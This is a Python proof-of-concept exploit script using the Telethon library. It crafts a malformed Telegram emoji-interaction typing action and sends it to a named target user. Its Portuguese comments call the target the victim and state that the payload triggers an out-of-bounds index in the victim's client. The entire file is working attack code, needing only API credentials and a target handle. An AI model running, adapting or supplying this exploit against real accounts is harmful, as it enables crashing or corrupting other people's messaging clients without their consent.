import os
import sys
import json
import struct
import asyncio

from telethon import TelegramClient, functions
from telethon.tl.tlobject import TLObject
from telethon.tl.functions.messages import SetTypingRequest

class DataJSON(TLObject):
    CONSTRUCTOR_ID = 0x7D748D04
    SUBCLASS_OF_ID = None

    def __init__(self, data: str):
        self.data = data

    def _bytes(self):
        return b''.join((
            struct.pack('<I', self.CONSTRUCTOR_ID),
            self.serialize_bytes(self.data),
        ))

    def to_dict(self):
        return {'_': 'DataJSON', 'data': self.data}

    to_bytes = _bytes
    __bytes__ = _bytes


class SendMessageEmojiInteraction(TLObject):
    CONSTRUCTOR_ID = 0x25972BCB
    SUBCLASS_OF_ID = None

    def __init__(self, emoticon: str, msg_id: int, interaction: DataJSON):
        self.emoticon = emoticon
        self.msg_id = msg_id
        self.interaction = interaction

    def _bytes(self):
        return b''.join((
            struct.pack('<I', self.CONSTRUCTOR_ID),
            self.serialize_bytes(self.emoticon),
            struct.pack('<i', self.msg_id),
            self.interaction._bytes(),
        ))

    def to_dict(self):
        return {'_': 'SendMessageEmojiInteraction', 'emoticon': self.emoticon,
                'msg_id': self.msg_id, 'interaction': self.interaction.to_dict()}

    to_bytes = _bytes
    __bytes__ = _bytes


INTERACTION_JSON = json.dumps({"v": 1, "a": [{"i": 0, "t": 0.5}]}, separators=(',', ':'))

EMOJI = "❤️"   


API_ID = 
API_HASH = ""

TARGET = "@temp8891"


async def main():
    api_id = os.environ.get("TG_API_ID", API_ID)
    api_hash = os.environ.get("TG_API_HASH", API_HASH)
    target = os.environ.get("TARGET", TARGET)
    if not (api_id and api_hash and target and not target.startswith("@COLOQUE")):
        print("defina TARGET (usuario/telefone/id da vitima) no topo do script")
        return 1

    async with TelegramClient("attacker", int(api_id), api_hash) as client:
        me = await client.get_me()
        print(f"[.] logado como : id={me.id} @{me.username}")

        peer = await client.get_input_entity(target)
        print(f"[.] peer B resolvido : {peer!r}")

        print(f"[.] mandando mensagem '{EMOJI}' para {target} ...")
        msg = await client.send_message(peer, EMOJI)
        msg_id = msg.id
        print(f"[.] mensagem enviada, id = {msg_id}")

        await asyncio.sleep(1.5)

        action = SendMessageEmojiInteraction(
            emoticon=EMOJI,
            msg_id=msg_id,
            interaction=DataJSON(INTERACTION_JSON),
        )
        print(f"[.] enviando action: interaction={INTERACTION_JSON}")
        print("[.] (i=0 => index=-1 => begin(list)-1 => OOB no cliente vitima)")
        try:
            res = await client(SetTypingRequest(peer=peer, action=action))
            print(f"[.] resposta do servidor: {res!r}")
            if res is False:
                print("[!] servidor retornou False — provavelmente ignorou/rejeitou a action")
        except Exception as e:
            print(f"[X] erro ao enviar o action: {type(e).__name__}: {e}")
            raise

        print("[.] enviado.")
        await asyncio.sleep(2.0)
    return 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
